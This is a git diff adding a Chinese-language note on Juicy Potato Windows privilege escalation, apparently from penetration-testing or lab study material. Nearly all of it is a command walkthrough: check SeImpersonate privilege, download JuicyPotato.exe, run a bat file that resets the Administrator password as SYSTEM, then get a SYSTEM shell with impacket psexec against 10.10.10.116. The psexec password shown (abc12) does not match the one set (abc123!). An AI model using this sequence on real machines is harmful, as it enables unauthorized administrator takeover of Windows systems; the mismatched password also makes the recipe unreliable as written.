@@ -105,3 +105,36 @@ exit(0);
 }
 }
 ```
+# JUICY POTATO提权
+
+查看权限，SeImpersonate为enabled
+
+```bash
+whoami /priv
+```
+使用https://github.com/ohpe/juicy-potato
+
+下载JuicyPotato
+```bash
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+```
+编写bat文件
+```bash
+net user Administrator abc123!
+```
+利用JuicyPotato以system权限执行bat文件
+```bash
+.\juicypotato.exe -t * -p C:\Users\Public\root.bat -l 9001 -c {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
+```
+使用Python impacket获取system权限shell
+
+
+https://github.com/SecureAuthCorp/impacket
+
+```bash
+psexec.py administrator@10.10.10.116 # password: abc12
+```
+
+
+
+
